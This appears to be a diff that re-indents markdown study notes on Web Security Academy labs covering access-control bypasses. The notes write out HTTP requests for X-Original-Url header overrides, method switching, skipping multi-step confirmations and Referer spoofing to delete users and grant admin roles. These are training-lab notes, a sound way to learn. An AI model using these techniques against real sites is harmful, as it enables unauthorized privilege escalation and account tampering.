@@ -893,31 +893,31 @@
    - view other chat history   
      GET /download-transcript/`1.txt`     
 10. **URL-based** access control can be circumvented
-   - GET /admin > access denied
-   - GET /  > response 200
-     X-Original-Url: /admin
-   - Delete the user `<a href="/admin/delete?username=carlos">`   
-     GET `/?username=carlos`   
+    - GET /admin > access denied
+    - GET /  > response 200
+      X-Original-Url: /admin
+    - Delete the user `<a href="/admin/delete?username=carlos">`   
+      GET `/?username=carlos`   
      `X-Original-Url: /admin/delete`   
 11. **Method-based** access control can be circumvented
-   - **Admin upgrade user**
-     POST /admin-roles   
-     username=carlos&action=upgrade   
-   - Another window **login as normal user (wiener)**
-     Right click repeater of POST /admin-roles > **Change request method**
-     change the session to own cookies
-     **GET** /admin-roles?**username=wiener**&action=upgrade  
+    - **Admin upgrade user**
+      POST /admin-roles   
+      username=carlos&action=upgrade   
+    - Another window **login as normal user (wiener)**
+      Right click repeater of POST /admin-roles > **Change request method**
+      change the session to own cookies
+      **GET** /admin-roles?**username=wiener**&action=upgrade  
 12. **Multi-step process** with no access control on one step
-   - 1st step: POST /admin-roles   
-     username=carlos&action=upgrade > access denied   
-   - 2nd step Confirmation: POST /admin-roles   
-     action=upgrade&**confirmed=true**&**username=wiener**   
-     **Replace cookies with attacker's one** and replay it > OK   
+    - 1st step: POST /admin-roles   
+      username=carlos&action=upgrade > access denied   
+    - 2nd step Confirmation: POST /admin-roles   
+      action=upgrade&**confirmed=true**&**username=wiener**   
+      **Replace cookies with attacker's one** and replay it > OK   
 13. **Referer**-based access control   
-   GET /admin-roles?**username=wiener**&action=upgrade   
-   Referer: https://0a6700d3044a5e898157ed94008d007c.web-security-academy.net/admin   
-   Login as wiener user, obtain the cookie, replace in the original admin's request   
-   Missing referer > get unauthorized error > paste back the referrer > OK   
+    GET /admin-roles?**username=wiener**&action=upgrade   
+    Referer: https://0a6700d3044a5e898157ed94008d007c.web-security-academy.net/admin   
+    Login as wiener user, obtain the cookie, replace in the original admin's request   
+    Missing referer > get unauthorized error > paste back the referrer > OK   
 
 ## File Upload
 **Example of remote code**   
